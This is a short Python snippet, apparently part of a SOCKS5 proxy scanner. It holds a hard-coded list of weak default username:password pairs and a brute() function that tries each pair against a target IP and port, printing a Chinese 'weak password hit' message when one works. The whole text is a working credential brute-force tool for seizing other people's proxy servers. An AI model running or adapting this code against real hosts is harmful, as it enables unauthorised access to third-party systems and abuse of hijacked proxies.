WEAK_PASSWORDS = [
        "123:123", "111:111", "1:1", "qwe123:qwe123", "abc:abc", "aaa:aaa",
    "1234:1234", "admin:admin", "socks5:socks5", "123456:123456",
    "12345678:12345678", "admin123:admin", "proxy:proxy", "admin:123456", "root:root",
    "12345:12345", "test:test", "user:user", "guest:guest", "admin:", "888888:888888", 
  "test123:test123", "qwe:qwe", "qwer:qwer", "qwer:qwer", "11:11", "222:222", "2:2", "3:3",
  "12349:12349", "12349:12349", "user:123", "user:1234", "user:12345", "user:123456"
]

def brute(ip: str, port: int):
    from scanner import is_socks5_available, TIMEOUT
    for pair in WEAK_PASSWORDS:
        user, pwd = pair.split(":", 1)
        ok, _, _ = is_socks5_available(ip, port, user, pwd)
        if ok:
            print(f"[+] 弱密码命中: {ip}:{port} → {user}:{pwd}")
            return user, pwd
    return None
